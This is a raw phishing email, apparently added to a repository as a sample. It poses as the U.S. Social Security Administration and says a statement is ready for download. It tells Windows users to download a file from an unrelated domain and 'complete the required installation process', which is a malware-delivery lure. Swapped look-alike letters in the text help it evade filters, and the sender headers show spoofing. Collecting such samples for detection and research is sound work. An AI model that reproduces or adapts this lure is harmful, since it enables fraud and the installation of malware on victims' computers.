@@ -1,0 +1,98 @@
+Return-Path: <DoNotReply_US@secure.net>
+Received: from secure.net (92-242-227-38.broadband.mtnet.hr [92.242.227.38])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id gt1lujhqe9k5ut6na8b9qu6vee90ut2v4888pcg1
+ for zingerpie@kfcreview.com;
+ Thu, 19 Nov 2026 17:35:11 +0000 (UTC)
+Received-SPF: none (spfCheck: 92.242.227.38 is neither permitted nor denied by domain of secure.net) client-ip=92.242.227.38; envelope-from=DoNotReply_US@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 92.242.227.38 is neither permitted nor denied by domain of secure.net) client-ip=92.242.227.38; envelope-from=DoNotReply_US@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIck9YVndRQ21GRXNqSmFmZFkzdW90OFVqRnduTUVBMnZlbG11c2szRmRYSjlxMStpQ2ZLWVpJK1NsOUlyZmtKS1lWZ2lzTW9YOHEyVS9DMDBNQW9VRU0rM3IvWHk5TFlWU0pLRmhwL0ZjOVpISS9xd2V4WmtJZ2NjWTVibm56eEloNWp5TG5iYkFnVS9aYTBtY3FWeDRrclJGZU1BeFcyZDFJaUFyRkpYRURqVnAxZ1pwN09TL0pQWFZGRFB6SmZISTVXZkdsMnp2c25HcDBnOE1ldXNVNHphRUNTeHNsRjB1a2EySDU1WnA4Tkdrc3JvSjMzMXJPN0Nhb0xUaDl4eU9zUEVxeWplZzBmektQNTVCTXlrbmsxczgwd0pQOEVaTERRWXdlK3lNaHg1YmdQUHgyZVkrWVZnTE0wTVRINW89
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=lFduAbWhhq0VsTNlFWm27XliC6VQI2VO20JK2Lq7mLULmzfl+mp2Ek+n5fybDLA6rDEGhBX5t3h3u72dFODsDmdN6WIam0b2pGfsuJCMQg0gO8LewMPRV5oiHOIecSSvzaPEsKsgxbtfN8pS9RebH6jRTR74iWy82+kSTxxlE1Q=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1795109711; v=1; bh=uhB66ghzYcanQDPtk6s82ueZoaDfXqyMjyMoSGw3/DQ=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "SSA Electronic Services" <DoNotReply_US@secure.net>
+To: zingerpie@kfcreview.com
+Subject: Information Regarding Your SSA Account
+Date: 19 Nov 2026 18:34:06 +0100
+Message-ID: <20261119183406.A736B49FEFE9DDBE@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 9.00.8112.21402"></HEAD>
+<BODY>
+<TABLE style=3D"BACKGROUND-COLOR: #f4f4f4" role=3Dpresentation border=3D0 c=
+ellSpacing=3D0 cellPadding=3D0 width=3D"100%">
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; P=
+ADDING-TOP: 20px" align=3Dcenter>
+<TABLE style=3D"BACKGROUND-COLOR: #ffffff; border-radius: 8px; box-shadow: =
+0 2px 4px rgba(0,0,0,0.1)" role=3Dpresentation border=3D0 cellSpacing=3D0 c=
+ellPadding=3D0 width=3D600>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; BACKGROUND-COLOR: #002a5c; PADDING-LEFT:=
+ 0px; PADDING-RIGHT: 0px; PADDING-TOP: 20px; border-radius: 8px 8px 0 0" al=
+ign=3Dcenter><IMG style=3D"BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: b=
+lock; MAX-WIDTH: 100%; BORDER-TOP: 0px; BORDER-RIGHT: 0px" border=3D0 alt=
+=3D"SSA Logo" src=3D"https://content.govdelivery.com/attachments/fancy_imag=
+es/USSSA/2019/10/2907643/top-01_original.png" width=3D265></TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 30px; BACKGROUND-COLOR: #d7e1e6; PADDING-LEFT:=
+ 40px; PADDING-RIGHT: 40px; PADDING-TOP: 30px">
+<H1 style=3D"LINE-HEIGHT: 1.4; MARGIN: 0px; FONT-FAMILY: Arial, Helvetica, =
+sans-serif; COLOR: #002a5c; FONT-SIZE: 28px"><FONT size=3D4>YOUR SOClAL SEC=
+URlTY STATEMENT lS AVAlLABlE </FONT></H1></TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 40px; PADDING-LEFT: 40px; PADDING-RIGHT: 40px;=
+ PADDING-TOP: 40px">
+<P style=3D"LINE-HEIGHT: 1.6; MARGIN: 0px 0px 20px; FONT-FAMILY: Arial, Hel=
+vetica, sans-serif; COLOR: #333333; FONT-SIZE: 16px">
+<SPAN style=3D"WIDOWS: 2; TEXT-TRANSFORM: none; BACKGROUND-COLOR: rgb(255,2=
+55,255); FONT-STYLE: normal; TEXT-INDENT: 0px; LETTER-SPACING: normal; DISP=
+LAY: inline !important; FONT-FAMILY: Roboto, -apple-system, BlinkMacSystemF=
+ont, 'Apple Color Emoji', 'Segoe UI', Oxygen, Ubuntu, Cantarell, 'Fira Sans=
+', 'Droid Sans', 'Helvetica Neue', sans-serif; WHITE-SPACE: pre-wrap; ORPHA=
+NS: 2; FLOAT: none; COLOR: rgb(0,0,0); FONT-SIZE: 16px; FONT-WEIGHT: 400; W=
+ORD-SPACING: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial">Thank you for choosing eIectronic statement deIivery.<BR>Your requ=
+ested SociaI Security Statement has been successfuIIy generated and is now =
+avaiIabIe for secure downIoad. This statement contains your current benefit=
+ information and account detaiIs.<BR><BR>CIick the DownIoad button beIow to=
+ access your document.<BR>
+<UL style=3D"MARGIN-TOP: 0px">
+<LI>Review your statement carefuIIy and foIIow any instructions provided.
+<LI>Save a copy of your statement for your personal records.
+<LI>Store your statement in a secure location for future reference<BR></LI>=
+</UL>
+<P>NOTlCE: This document is supported only by&nbsp;Windows PC systems only =
+and is not compatible with mobile devices, tablets, macOS, or other operati=
+ng systems.<BR>To access your statement, download the document and complete=
+ the required installation process before opening it.</SPAN> </P>
+<P></P>
+<TABLE role=3Dpresentation border=3D0 cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%">
+<TBODY>
+<TR>
+<TD align=3Dcenter>
+<TABLE role=3Dpresentation border=3D0 cellSpacing=3D0 cellPadding=3D0>
+<TBODY>
+<TR>
+<TD style=3D"BACKGROUND-COLOR: #093c8f; border-radius: 4px"><A style=3D"PAD=
+DING-BOTTOM: 15px; PADDING-LEFT: 30px; PADDING-RIGHT: 30px; DISPLAY: inline=
+-block; FONT-FAMILY: Arial, Helvetica, sans-serif; COLOR: #ffffff; FONT-SIZ=
+E: 16px; TEXT-DECORATION: none; PADDING-TOP: 15px; border-radius: 4px" titl=
+e=3Ddd href=3D"https://iffoc.com/sgov" rel=3Dnoopener target=3D_blank>Downl=
+oad</A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style=3D"TEXT-ALIGN: center; PADDING-BOTTOM: 20px; BACKGROUND-COLOR: #f=
+8f8f8; PADDING-LEFT: 20px; PADDING-RIGHT: 20px; PADDING-TOP: 20px; border-r=
+adius: 0 0 8px 8px">
+<P style=3D"MARGIN: 0px; FONT-FAMILY: Arial, Helvetica, sans-serif; COLOR: =
+#666666; FONT-SIZE: 12px">This is an automated message. Please do not reply=
+ to this email.</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<P>&nbsp;</P></BODY></HTML>
